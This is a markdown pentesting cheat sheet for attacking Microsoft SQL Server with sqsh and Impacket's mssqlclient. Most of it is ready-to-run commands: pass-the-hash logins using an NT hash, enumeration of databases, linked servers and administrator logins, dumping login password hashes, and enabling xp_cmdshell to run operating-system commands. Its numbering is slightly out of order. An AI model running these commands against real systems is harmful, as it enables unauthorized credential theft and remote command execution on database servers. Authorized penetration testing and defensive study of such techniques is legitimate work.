# Manual

## 01 - Setup

Note: The enumeration process is the same thing when using Windows own native program called `sqlcmd` or `osql` which is why `sqsh` on Linux uses the same syntax.

Install `sqsh` in Debian-based distros

```
$ sudo apt install sqsh
```

Install `sqsh` in Arch-based distros

```
$ yay -S sqsh
```

## 02 - Usage

Usage of the program.

```
$ sqsh -S <IP> -D <database> -U [<domain>\]<username> -P <password>

$ sqsh -S <IP> -D <database> -U [<domain\]<username -P 00000000000000000000000000000000:<nt_hash>
```

TODO: Re-arrange from this section to post exploitation under **Enumeration and Discovery**

## 04 - Operating System

### 4.1 - Hostname

Enumerate target machine hostname

```
1> SELECT HOST_NAME();
2> go
```

### 4.2 - Version

MSSQL version details

```
1> SELECT @@VERSION;
2> go
```

## 05 - Linked Servers

### 5.1 - Enumerate Linked Servers

```
1> EXEC sp_linkedservers;
2> SELECT * FROM sys.servers;
3> go
```

## 06 - Database

### 6.1 - Current Database

Enumerate current database

```
1> SELECT DB_NAME();
2> go
```

### 6.2 - Retrieve Database

Enumerate all available databases

```
1> SELECT name FROM sys.databases;
2> go

1> SELECT name FROM master.dbo.sysdatabases;
2> go
```

### 6.3 - Relation Names

- Enumerate table names

```
1> SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;
2> go
```

### 6.4 - Usernames

- Gather all users from MSSQL Database

```
1> SELECT sp.name AS login, sp.type_desc AS login_type, so.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS STATUS FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name;
2> go
```

- Gather all administrators logins

```
1> SELECT loginname FROM syslogins WHERE sysadmin = 1;
2> go
```

### 6.5 - Hashdump

Dump the hashes from the user accounts

```
1> SELECT name, password_hash FROM master.sys.sql_logins;
2> go
```

### 6.6 - Enable `xp_cmdshell`

Enumerate the xp_cmdshell whatever if it's enabled or not

```
1> SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
2> go
```

Enable xp_cmdshell for remote execution

```
1> EXEC sp_configure 'show advanced options', 1;
2> EXEC sp_configure 'xp_cmdshell', 1;
3> RECONFIGURE;
4> go

1> xp_cmdshell 'whoami';
2> go
```

## 02 - Impacket

### 2.1 - Help Menu

```
$ mssqlclient.py -h

SQL> help
```

### 2.2 - Usage

```
$ mssqlclient -db <database> -port 1433 -windows-auth <domain>/<username>:<password>@<IP>
```

### 2.3 - Enable `xp_cmdshell`

```
SQL> enable_xp_cmdshell
```

---
## References

- [SS64: SQLCMD](https://ss64.com/sql/sqlcmd.html)

- [Microsoft Documentation: Invoke-SQLCMD](https://learn.microsoft.com/en-us/powershell/module/sqlserver/invoke-sqlcmd?view=sqlserver-ps)

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

- [Hacking Articles: MSSQL for Pentester Command Execution with XP_Cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)